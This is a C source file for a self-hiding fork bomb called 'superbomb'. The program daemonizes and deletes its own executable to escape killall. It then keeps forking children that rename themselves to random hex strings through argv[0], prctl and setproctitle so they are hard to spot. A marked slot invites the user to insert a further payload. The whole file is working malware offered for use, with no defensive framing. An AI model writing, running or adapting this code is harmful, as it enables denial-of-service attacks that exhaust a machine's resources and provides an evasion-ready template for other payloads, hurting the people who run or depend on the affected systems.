/*
 *
 *                  USE ON YOUR OWN RISK!
 *
 *
 * cc -Wall -Wextra -std=c89 -o superbomb yafb.c
 * shell> ./superbomb
 */

#if defined(__linux__)
#include <sys/prctl.h>
#endif
#if defined(BSD)
#include <sys/types.h>
#endif
#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <err.h>

/* amount of forks created before the parent exited */
#define MAXFORKS 4


int
main (int argc, char *argv[])
{
        char executable[PATH_MAX];
        char temp[16];
        pid_t cpid;
        int len, nlen;
        int count = MAXFORKS;
        int i, k;
        char *p;
        struct timespec wtime, ptime;


        /* child fork sleep time */
        wtime.tv_sec = 0;
        wtime.tv_nsec = 1000000; /* 1 msec */

        /* payload sleep time */
        ptime.tv_sec = 0;
        ptime.tv_nsec = 50000000; /* 50 msec */

        while ((cpid = fork ()) == -1)
            sleep (1);

        if (cpid > 0)
            exit (EXIT_SUCCESS); /* daemonize */

        len = strlen (argv[0]);
        strncpy (executable, argv[0], len);
        unlink (executable); /* killall(1) looks for /proc/[pid]/exe */

        if (chdir ("/") < 0)
            err (1, "chdir");

        while (count--) {
                while ((cpid = fork ()) == -1)
                    nanosleep (&wtime, NULL);

                /* parent process continues cloning itself */
                if (cpid > 0) {
                        if (count == 0)
                                exit (EXIT_SUCCESS); /* stop parent */
                        else
                                continue;
                }

                setsid ();

                if ((p = malloc (sizeof(char))) == NULL)
                    exit (EXIT_FAILURE);

                sprintf (temp, "%lx", (long unsigned int)p);
                nlen = strlen (temp) - MAXFORKS;
                free (p); /* prevent cow "hacks" */

                char next[256];
                for (i = 0, k = count; i < len; i++, k++) {
                        if (k >= nlen)
                                k = 0;
                        next[i] = temp[k];
                }
                next[i] = '\0';

#if defined(__linux__)
                /* /proc/[pid]/cmdline */
                strncpy (argv[0], next, len);
                /* /proc/[pid]/comm */
                prctl (PR_SET_NAME, (unsigned long)next, 0, 0, 0);
#elif defined(__FreeBSD__)
                setproctitle ("%s", next);
#else
                strncpy (argv[0], next, len); /* cmdline */
#endif
                /*
                 * payload: put your stuff
                 */
                if (count == 0) /*pause ();*/
                        count = MAXFORKS;
                nanosleep (&ptime, NULL);
        }

        return 0;
}
